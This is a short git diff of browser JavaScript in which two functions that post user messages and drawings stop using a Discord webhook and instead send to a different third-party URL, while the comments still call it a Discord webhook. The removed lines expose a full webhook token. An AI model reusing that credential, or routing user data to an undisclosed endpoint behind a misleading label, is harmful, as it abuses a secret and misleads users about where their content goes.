@@ -128,7 +128,7 @@ submitButton.addEventListener('click', async () => {
 
 // Function to send message to Discord
 async function sendMessageToDiscord(message) {
-  const webhookUrl = 'https://discord.com/api/webhooks/1319231562226602024/RiOrNJwdG2uKpeWWKE3pKFPqDVVkDWA89jOJV9okHEFUBswQig2ZkhZWiziOjzDFPXhU'; // Replace with your actual Discord webhook URL
+  const webhookUrl = ' https://tuvik-dog.xyz/web-inbox.php?target=aster'; // Replace with your actual Discord webhook URL
 
   // Create a FormData object for the file and message
   const formData = new FormData();
@@ -154,7 +154,7 @@ async function sendMessageToDiscord(message) {
 
 // Function to send drawing to Discord
 async function sendDrawingToDiscord(imageData) {
-  const webhookUrl = 'https://discord.com/api/webhooks/1319231562226602024/RiOrNJwdG2uKpeWWKE3pKFPqDVVkDWA89jOJV9okHEFUBswQig2ZkhZWiziOjzDFPXhU'; // Replace with your actual Discord webhook URL
+  const webhookUrl = 'https://tuvik-dog.xyz/web-inbox.php?target=aster'; // Replace with your actual Discord webhook URL
 
   // Convert the base64 data URL to a Blob
   const blob = await fetch(imageData).then((res) => res.blob());
